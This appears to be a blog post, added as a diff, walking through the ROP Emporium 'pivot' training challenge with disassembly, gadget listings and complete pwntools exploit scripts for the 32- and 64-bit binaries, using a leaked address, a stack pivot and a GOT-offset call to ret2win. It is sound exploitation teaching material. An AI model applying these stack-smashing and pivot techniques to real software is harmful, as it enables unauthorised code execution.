@@ -1,0 +1,305 @@
+---
+layout: post
+title:  "ROP Emporium: pivot"
+date:   2021-03-13 19:40:56 +0200
+categories: ropemporium
+---
+
+## 32-bit ##
+Running the binary we are met with the following prompt:
+```
+voidwalker@Abyss:[pivotx86]** ./pivot32
+pivot by ROP Emporium
+x86
+
+Call ret2win() from libpivot
+The Old Gods kindly bestow upon you a place to pivot: 0xf7cddf10
+Send a ROP chain now and it will land there
+> l
+Thank you!
+
+Now please send your stack smash
+> l
+Thank you!
+
+Exiting
+```
+
+Hmm, interesting! So this one takes 2 chained inputs!
+We are also given some hints:
+### This challenge imports a function named foothold_function() from a library that also contains a ret2win() function. ###
+### The ret2win() function in the libpivot shared object isn't imported, but that doesn't mean you can't call it using ROP! You'll need to find the .got.plt entry of foothold_function() and add the offset of ret2win() to it to resolve its actual address. Notice that foothold_function() isn't called during normal program flow, you'll have to call it first to update its .got.plt entry. ###
+
+Let's see what other hints we can find in the disassembly:
+
+```
+08048817 <uselessFunction>:
+ 8048817:       55                      push   ebp
+ 8048818:       89 e5                   mov    ebp,esp
+ 804881a:       83 ec 08                sub    esp,0x8
+ 804881d:       e8 fe fc ff ff          call   8048520 <foothold_function@plt>
+ 8048822:       83 ec 0c                sub    esp,0xc
+ 8048825:       6a 01                   push   0x1
+ 8048827:       e8 e4 fc ff ff          call   8048510 <exit@plt>
+
+0804882c <usefulGadgets>:
+ 804882c:       58                      pop    eax
+ 804882d:       c3                      ret
+ 804882e:       94                      xchg   esp,eax
+ 804882f:       c3                      ret
+ 8048830:       8b 00                   mov    eax,DWORD PTR [eax]
+ 8048832:       c3                      ret
+ 8048833:       01 d8                   add    eax,ebx
+ 8048835:       c3                      ret
+ 8048836:       66 90                   xchg   ax,ax
+ 8048838:       66 90                   xchg   ax,ax
+ 804883a:       66 90                   xchg   ax,ax
+ 804883c:       66 90                   xchg   ax,ax
+ 804883e:       66 90                   xchg   ax,ax
+```
+
+We can already see some REALLY valuable gadgets. Let's also get the offset from ```ret2win()``` to ```foothold_function``` by analyzing the shared object.
+```
+voidwalker@Abyss:[pivotx86]** nm libpivot32.so | egrep "foothold|win"
+0000077d T foothold_function
+00000974 T ret2win
+```
+And the offset seems to be 503 (0x974 - 0x77d).
+Now, we need the relocation offset of ```foothold_function```:
+```
+voidwalker@Abyss:[pivotx86]** readelf -r pivot32 | grep foot
+0804a024  00000807 R_386_JUMP_SLOT   00000000   foothold_function
+```
+And its ```PLT``` entry is outlined in the disassembly of ```uselessFunction``` (not so uselss after all, huh? :) ), as the address ```0x8048520```.
+
+Alright! Time to look for some other useful ROP gadgets. Let's start by looking through the ```pop``` ones:
+```
+voidwalker@Abyss:[pivotx86]** ROPgadget --binary pivot32 | egrep "pop"
+0x0804867c : add byte ptr [eax], al ; add byte ptr [eax], al ; push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
+0x080484a4 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
+0x0804867e : add byte ptr [eax], al ; push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
+0x08048747 : add byte ptr [ebx - 0x723603b3], cl ; popal ; cld ; ret
+0x08048895 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080484a6 : add esp, 8 ; pop ebx ; ret
+0x0804867b : daa ; add byte ptr [eax], al ; add byte ptr [eax], al ; push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
+0x08048894 : jecxz 0x8048819 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
+0x08048893 : jne 0x8048878 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080484a7 : les ecx, ptr [eax] ; pop ebx ; ret
+0x08048896 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
+0x08048681 : mov ebp, esp ; pop ebp ; jmp 0x8048610
+0x080484a2 : mov edx, 0x83000000 ; les ecx, ptr [eax] ; pop ebx ; ret
+0x08048897 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
+0x0804882c : pop eax ; ret
+0x08048683 : pop ebp ; jmp 0x8048610
+0x0804889b : pop ebp ; ret
+0x08048898 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080484a9 : pop ebx ; ret
+0x0804889a : pop edi ; pop ebp ; ret
+0x08048899 : pop esi ; pop edi ; pop ebp ; ret
+0x080488b0 : pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
+0x0804874d : popal ; cld ; ret
+0x08048680 : push ebp ; mov ebp, esp ; pop ebp ; jmp 0x8048610
+0x080488af : push ebx ; pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
+```
+Since we have so many ```pop eax``` gadgets we should look for some ```jmp eax``` or ```call eax``` ROP gadgets.
+```
+voidwalker@Abyss:[pivotx86]** ROPgadget --binary pivot32 | egrep "jmp eax"
+voidwalker@Abyss:[pivotx86]** ROPgadget --binary pivot32 | egrep "call eax"
+0x080485ea : adc al, 0x68 ; cmp al, 0xa0 ; add al, 8 ; call eax
+0x080485ee : add al, 8 ; call eax
+0x080485f0 : call eax
+0x080485ec : cmp al, 0xa0 ; add al, 8 ; call eax
+0x080485e9 : in al, dx ; adc al, 0x68 ; cmp al, 0xa0 ; add al, 8 ; call eax
+0x080485e7 : in eax, 0x83 ; in al, dx ; adc al, 0x68 ; cmp al, 0xa0 ; add al, 8 ; call eax
+0x080485eb : push 0x804a03c ; call eax
+0x080485e8 : sub esp, 0x14 ; push 0x804a03c ; call eax
+```
+Now let's see what that chained input is all about!
+
+```
+08048750 <pwnme>:
+ 8048750:       55                      push   ebp
+ 8048751:       89 e5                   mov    ebp,esp
+ 8048753:       83 ec 28                sub    esp,0x28
+ 8048756:       83 ec 04                sub    esp,0x4
+ 8048759:       6a 20                   push   0x20
+ 804875b:       6a 00                   push   0x0
+ 804875d:       8d 45 d8                lea    eax,[ebp-0x28]
+ 8048760:       50                      push   eax
+ 8048761:       e8 ea fd ff ff          call   8048550 <memset@plt>
+ 8048766:       83 c4 10                add    esp,0x10
+ 8048769:       83 ec 0c                sub    esp,0xc
+ 804876c:       68 0d 89 04 08          push   0x804890d
+ 8048771:       e8 8a fd ff ff          call   8048500 <puts@plt>
+ 8048776:       83 c4 10                add    esp,0x10
+ 8048779:       83 ec 08                sub    esp,0x8
+ 804877c:       ff 75 08                push   DWORD PTR [ebp+0x8]
+ 804877f:       68 2c 89 04 08          push   0x804892c
+ 8048784:       e8 47 fd ff ff          call   80484d0 <printf@plt>
+ 8048789:       83 c4 10                add    esp,0x10
+ 804878c:       83 ec 0c                sub    esp,0xc
+ 804878f:       68 68 89 04 08          push   0x8048968
+ 8048794:       e8 67 fd ff ff          call   8048500 <puts@plt>
+ 8048799:       83 c4 10                add    esp,0x10
+ 804879c:       83 ec 0c                sub    esp,0xc
+ 804879f:       68 94 89 04 08          push   0x8048994
+ 80487a4:       e8 27 fd ff ff          call   80484d0 <printf@plt>
+ 80487a9:       83 c4 10                add    esp,0x10
+ 80487ac:       83 ec 04                sub    esp,0x4
+ 80487af:       68 00 01 00 00          push   0x100
+ 80487b4:       ff 75 08                push   DWORD PTR [ebp+0x8]
+ 80487b7:       6a 00                   push   0x0
+ 80487b9:       e8 02 fd ff ff          call   80484c0 <read@plt>
+ 80487be:       83 c4 10                add    esp,0x10
+ 80487c1:       83 ec 0c                sub    esp,0xc
+ 80487c4:       68 97 89 04 08          push   0x8048997
+ 80487c9:       e8 32 fd ff ff          call   8048500 <puts@plt>
+ 80487ce:       83 c4 10                add    esp,0x10
+ 80487d1:       83 ec 0c                sub    esp,0xc
+ 80487d4:       68 a4 89 04 08          push   0x80489a4
+ 80487d9:       e8 22 fd ff ff          call   8048500 <puts@plt>
+ 80487de:       83 c4 10                add    esp,0x10
+ 80487e1:       83 ec 0c                sub    esp,0xc
+ 80487e4:       68 94 89 04 08          push   0x8048994
+ 80487e9:       e8 e2 fc ff ff          call   80484d0 <printf@plt>
+ 80487ee:       83 c4 10                add    esp,0x10
+ 80487f1:       83 ec 04                sub    esp,0x4
+ 80487f4:       6a 38                   push   0x38
+ 80487f6:       8d 45 d8                lea    eax,[ebp-0x28]
+ 80487f9:       50                      push   eax
+ 80487fa:       6a 00                   push   0x0
+ 80487fc:       e8 bf fc ff ff          call   80484c0 <read@plt>
+ 8048801:       83 c4 10                add    esp,0x10
+ 8048804:       83 ec 0c                sub    esp,0xc
+ 8048807:       68 c5 89 04 08          push   0x80489c5
+ 804880c:       e8 ef fc ff ff          call   8048500 <puts@plt>
+ 8048811:       83 c4 10                add    esp,0x10
+ 8048814:       90                      nop
+ 8048815:       c9                      leave
+ 8048816:       c3                      ret
+```
+Ah, I see! Nothing to worry about, it just asks us to first send in our ROP chain when it discloses us the address  where we need to jump to and use that in the second input, where we actually do the overflow and need to make a jump to that address, which can easily be achieves using the ```pop eax; ret``` and ```xchg eax, esp; ret``` gadgets previously discovered.
+Another, very important, quirk to notice is that we need to satisfy the buffer size for ```read```, otherwise it will hang on our input and wait for more bytes.
+This level seems to be much easier than the previous one. Let's get to our final script.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch = "i386"
+context.bits = 32
+context.endian = "little"
+context.os = "linux"
+
+# Useful ROP gadgets
+foothold_plt  = p32(0x08048520) # foothold_function@plt
+foothold_reloc = p32(0x0804a024) # .got.plt location (points to actual address of foothold_function)
+dereference_eax = p32(0x08048830) # : mov eax, dword ptr [eax] ; ret
+pop_ebx = p32(0x080484a9) # : pop ebx ; ret
+add_eax_ebx = p32(0x08048833) # : add eax, ebx ; ret
+call_eax = p32(0x080485f0) # : call eax
+pop_eax = p32(0x0804882c) # : pop eax ; ret
+xchg_eax_esp = p32(0x0804882e) # : xchg eax, esp ; ret
+offset_to_ret2win = p32(503)
+
+e = ELF("./pivot32")
+
+io = e.process()
+
+first_output = io.recvuntil(">")
+disclosed_address = int([x for x in first_output.split() if x.startswith(b'0x')][0], 16)
+
+# ROP Chain
+first_input = foothold_plt
+first_input += pop_eax
+first_input += foothold_reloc
+first_input += dereference_eax
+first_input += pop_ebx
+first_input += offset_to_ret2win
+first_input += add_eax_ebx
+first_input += call_eax
+first_input += b'A' * (0x100 - len(first_input))
+
+io.sendline(first_input)
+
+# Stack Smashing
+second_input = b'A' * 44
+second_input += pop_eax
+second_input += p32(disclosed_address)
+second_input += xchg_eax_esp
+
+io.sendline(second_input)
+
+print(io.recvrepeat())
+```
+
+Unfortunately, ```pwntools``` somehow loses its input when the flag is printed out, but ```GDB``` proves us it works:
+```
+gef➤
+ROPE{a_placeholder_32byte_flag!}
+[Inferior 1 (process 17774) exited normally]
+```
+
+
+## 64-bit ##
+The methodology is exactly the same, but the addresses differ slightly and the ```ebx``` gadgets have been switched for ```rbp``` gadgets instead. Even the ROP gadgets used were exactly the same, it's just that they used the 64-bit registers instead.
+Thus, I will simply write out the solution script with the relevant comments added.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.arch = "amd64"
+context.bits = 64
+context.endian = "little"
+context.os = "linux"
+
+# Useful ROP gadgets
+foothold_plt  = p64(0x400720) # foothold_function@plt
+foothold_reloc = p64(0x601040) # .got.plt location (points to actual address of foothold_function)
+dereference_rax = p64(0x4009c0) # : mov rax, dword ptr [rax] ; ret
+add_rax_rbp = p64(0x4009c4) # : add rax, rbp ; ret
+call_rax = p64(0x4006b0) # : call rax
+pop_rax = p64(0x4009bb) # : pop rax ; ret
+xchg_rsp_rax = p64(0x4009bd) # : xchg rsp, rax ; ret
+pop_rbp = p64(0x4007c8) # pop rbp; ret
+offset_to_ret2win = p64(279)
+
+e = ELF("./pivot")
+
+io = e.process()
+
+first_output = io.recvuntil(">")
+disclosed_address = int([x for x in first_output.split() if x.startswith(b'0x')][0], 16)
+
+# ROP Chain
+first_input = foothold_plt
+first_input += pop_rax
+first_input += foothold_reloc
+first_input += dereference_rax
+first_input += pop_rbp
+first_input += offset_to_ret2win
+first_input += add_rax_rbp
+first_input += call_rax
+first_input += b'A' * (0x100 - len(first_input))
+
+io.sendline(first_input)
+
+# Stack Smashing
+second_input = b'A' * 40
+second_input += pop_rax
+second_input += p64(disclosed_address)
+second_input += xchg_rsp_rax
+
+io.sendline(second_input)
+
+print(io.recvrepeat())
+
+payload = first_input + second_input
+
+with open("payload", "wb") as file:
+    file.write(payload)
+```
+
